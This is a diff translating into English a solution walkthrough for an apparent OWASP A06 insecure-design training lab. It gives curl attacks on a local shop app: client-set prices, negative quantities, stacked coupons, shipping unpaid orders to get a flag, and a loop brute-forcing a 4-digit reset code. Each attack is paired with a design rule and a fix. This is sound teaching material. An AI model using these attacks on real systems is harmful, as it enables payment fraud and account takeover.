@@ -1,11 +1,11 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A06 — Разбор решения (спойлеры)
+# A06 — Solution walkthrough (spoilers)
 
-Все примеры — через `curl`. Замените `COOKIE` на cookie сессии, полученный
-после `/login` (`curl -c cookies.txt ...` / `-b cookies.txt`).
+All examples use `curl`. Replace `COOKIE` with the session cookie obtained
+after `/login` (`curl -c cookies.txt ...` / `-b cookies.txt`).
 
-## 0. Логин
+## 0. Login
 
 ```bash
 curl -s -c cookies.txt -X POST http://127.0.0.1:8051/login \
@@ -13,61 +13,60 @@ curl -s -c cookies.txt -X POST http://127.0.0.1:8051/login \
   -d '{"username":"alice","password":"alice123"}'
 ```
 
-## Дефект 1 — цена от клиента
+## Defect 1 — the price comes from the client
 
-`create_order()` берёт цену так:
+`create_order()` takes the price like this:
 ```python
 price = it.get("price", product["price"])
 ```
-Сервер верит присланной цене, если она есть в запросе.
+The server trusts the price that was sent, if it is in the request.
 
 ```bash
 curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
   -H 'Content-Type: application/json' \
   -d '{"items":[{"product_id":3,"quantity":1,"price":1}]}'
-# total: 1 вместо 500000
+# total: 1 instead of 500000
 ```
 
-**Правило дизайна:** цена — это бизнес-факт, который знает только сервер.
-Клиент может присылать `product_id` и `quantity`, но никогда не величину,
-влияющую на деньги напрямую.
+**Design rule:** the price is a business fact that only the server knows.
+The client may send `product_id` and `quantity`, but never a value that
+directly affects money.
 
-**Fix:** `price = product["price"]` — поле `price` из запроса просто
-игнорируется (`fixed/app.py`, `# FIX 1`).
+**Fix:** `price = product["price"]` — the `price` field from the request is
+simply ignored (`fixed/app.py`, `# FIX 1`).
 
-## Дефект 2 — неограниченное/отрицательное количество
+## Defect 2 — unlimited/negative quantity
 
 ```bash
 curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
   -H 'Content-Type: application/json' \
   -d '{"items":[{"product_id":2,"quantity":-10}]}'
-# total: -1500000 → при оплате баланс alice не уменьшится, а вырастет
+# total: -1500000 → on payment alice's balance does not go down, it goes up
 ```
 
-**Правило:** любое числовое поле от клиента, участвующее в расчётах денег,
-нужно ограничивать допустимым диапазоном (здесь 1–10), а не просто проверять
-на «существует».
+**Rule:** any numeric field from the client that takes part in money
+calculations must be limited to a valid range (here 1–10), not just checked
+for "exists".
 
-**Fix:** `1 <= qty <= MAX_QTY`, иначе 400 (`# FIX 2`).
+**Fix:** `1 <= qty <= MAX_QTY`, otherwise 400 (`# FIX 2`).
 
-## Дефект 3 — купон без ограничений
+## Defect 3 — a coupon without limits
 
 ```bash
 curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
   -H 'Content-Type: application/json' \
   -d '{"items":[{"product_id":2,"quantity":1}],"coupons":["WELCOME50","WELCOME50","WELCOME50"]}'
-# скидка суммируется трижды
+# the discount is added up three times
 ```
 
-**Правило:** бизнес-правило «один купон = одна скидка, один раз на
-пользователя» должно быть явно закодировано, а не следовать «само собой» из
-способа подсчёта.
+**Rule:** the business rule "one coupon = one discount, once per user" must
+be coded explicitly, not follow "by itself" from the way the sum is computed.
 
-**Fix:** не более одного купона в заказе, купон должен быть неиспользован
-пользователем; факт использования фиксируется в момент оплаты, а не создания
-заказа (`# FIX 3`, и повторная проверка внутри `/pay`).
+**Fix:** at most one coupon per order, and the coupon must be unused by the
+user; the fact of use is recorded at the moment of payment, not when the
+order is created (`# FIX 3`, and a second check inside `/pay`).
 
-## Дефект 4/5 — обход порядка шагов (создание → оплата → отгрузка)
+## Defect 4/5 — bypassing the order of steps (create → pay → ship)
 
 ```bash
 OID=$(curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
@@ -75,25 +74,25 @@ OID=$(curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
   -d '{"items":[{"product_id":3,"quantity":1}]}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
 
 curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders/$OID/ship
-# {"flag": "FLAG{A06_gift_delivered_without_paying_properly}", "status": "shipped"} — без оплаты!
+# {"flag": "FLAG{A06_gift_delivered_without_paying_properly}", "status": "shipped"} — without paying!
 ```
 
-Также заказ можно оплатить повторно (`/pay` не проверяет `status`), а в
-сочетании с дефектом 2 (отрицательная сумма) это ещё и увеличивает баланс
-атакующего при каждом повторном вызове.
+An order can also be paid again (`/pay` does not check `status`), and
+combined with defect 2 (a negative total) this also raises the attacker's
+balance on every repeated call.
 
-**Правило:** многошаговый процесс (created → paid → shipped) — это конечный
-автомат. Каждый переход обязан проверять **текущее состояние**, а не
-полагаться на то, что клиент вызовет эндпоинты «в правильном порядке».
-Порядок вызовов задаёт клиент — доверять ему нельзя.
+**Rule:** a multi-step process (created → paid → shipped) is a state
+machine. Every transition must check the **current state**, not rely on the
+client calling the endpoints "in the right order". The order of calls is set
+by the client — it cannot be trusted.
 
-**Fix:** `/pay` требует `status == "created"`, `/ship` требует
+**Fix:** `/pay` requires `status == "created"`, `/ship` requires
 `status == "paid"` (`# FIX 4`, `# FIX 5`).
 
-## Дефект 6/7 — перебор кода восстановления пароля
+## Defect 6/7 — brute-forcing the password recovery code
 
-В логах `docker compose logs vulnerable` видно 4-значный код
-(`random.randint(0, 9999)`) без ограничения попыток:
+In the `docker compose logs vulnerable` logs you can see a 4-digit code
+(`random.randint(0, 9999)`) with no limit on attempts:
 
 ```bash
 for i in $(seq -w 0 9999); do
@@ -103,29 +102,31 @@ for i in $(seq -w 0 9999); do
   echo "$r" | grep -q '"ok": true' && echo "FOUND: $i" && break
 done
 ```
-10 000 вариантов перебираются за секунды — сервер не ограничивает число
-попыток и не использует криптостойкий генератор.
+10,000 options are tried in seconds — the server does not limit the number
+of attempts and does not use a cryptographically strong generator.
 
-**Правило:** одноразовый код — это секрет с коротким временем жизни и
-ограниченным числом попыток подбора. Длины и источника случайности
-(`random`, не криптостойкий) недостаточно самих по себе — нужна защита от
-перебора на уровне процесса, а не только «длиннее число».
+**Rule:** a one-time code is a secret with a short lifetime and a limited
+number of guesses. Length and source of randomness (`random`, which is not
+cryptographically strong) are not enough on their own — you need protection
+against brute force at the process level, not just "a longer number".
 
 **Fix** (`fixed/app.py`):
-- `secrets.randbelow()` вместо `random.randint()`, код из 6 цифр;
-- `OTP_MAX_ATTEMPTS = 5` — после 5 неверных попыток код уничтожается;
-- `OTP_TTL = 300` секунд — код сгорает по времени;
-- `OTP_COOLDOWN = 60` секунд — нельзя мгновенно перевыпускать код, обнуляя
-  счётчик попыток;
-- сравнение кода через `hmac.compare_digest` (устойчиво к timing-атакам);
-- `/password-reset/request` отвечает одинаково независимо от того,
-  существует пользователь или нет (не даёт перечислить аккаунты).
+- `secrets.randbelow()` instead of `random.randint()`, a 6-digit code;
+- `OTP_MAX_ATTEMPTS = 5` — after 5 wrong attempts the code is destroyed;
+- `OTP_TTL = 300` seconds — the code expires with time;
+- `OTP_COOLDOWN = 60` seconds — a code cannot be reissued instantly to reset
+  the attempt counter;
+- the code is compared with `hmac.compare_digest` (resistant to timing
+  attacks);
+- `/password-reset/request` answers the same whether or not the user exists
+  (it does not allow enumerating accounts).
 
-## Итог: что в этой лабе относится именно к Insecure Design
+## Summary: what in this lab is specifically Insecure Design
 
-Ни один из семи дефектов не чинится добавлением экранирования, фильтра или
-одной проверки прав — везде нужно было **на этапе проектирования** решить:
-кто источник истины для цены; какие диапазоны допустимы; сколько раз можно
-применить скидку; какие переходы состояния разрешены; как защитить
-одноразовый секрет от перебора. Это и есть суть A06 — уязвимость живёт не в
-строке кода, а в отсутствующем правиле.
+Not one of the seven defects is fixed by adding escaping, a filter or a
+single permission check — in every case a decision had to be made **at the
+design stage**: who is the source of truth for the price; which ranges are
+valid; how many times a discount may be applied; which state transitions are
+allowed; how to protect a one-time secret from brute force. That is the
+essence of A06 — the vulnerability lives not in a line of code but in a
+missing rule.
